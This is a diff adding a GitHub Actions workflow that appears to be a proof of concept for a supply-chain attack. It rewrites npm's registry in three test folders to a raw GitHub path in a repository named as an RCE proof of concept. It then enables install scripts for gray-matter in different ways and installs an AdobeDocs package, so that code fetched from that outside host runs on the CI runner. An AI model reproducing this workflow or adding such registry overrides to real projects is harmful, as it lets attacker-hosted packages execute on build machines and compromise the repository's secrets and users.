@@ -1,0 +1,35 @@
+---
+name: npm-probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          GH_REPO_UNDER_TEST: ${{ github.repository }}
+        run: |
+          echo "npm=$(npm --version) node=$(node --version)"
+          run() {
+            d="$1"; shift
+            echo "########## $d"
+            ( cd "$d" && npm config get registry && \
+              npm view gray-matter versions --json 2>&1 | tail -3 && \
+              npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -25 ; \
+              echo "exit=$?"; \
+              cat node_modules/gray-matter/package.json 2>/dev/null | head -8; \
+              ls node_modules/gray-matter 2>/dev/null )
+          }
+
+          mkdir -p v1 v2 v3
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-postlint-rce/main/npmreg/\naudit=false\nfund=false\nprogress=false\n' > v1/.npmrc
+          cp v1/.npmrc v2/.npmrc
+          cp v1/.npmrc v3/.npmrc
+          printf '%s\n' '{"name":"p1","version":"1.0.0","allowScripts":{"gray-matter":true}}' > v1/package.json
+          printf 'allow-scripts=gray-matter\n' >> v2/.npmrc
+          printf '%s\n' '{"name":"p3","version":"1.0.0","allowScripts":{"gray-matter@*":true}}' > v3/package.json
+          run v1
+          run v2
+          run v3
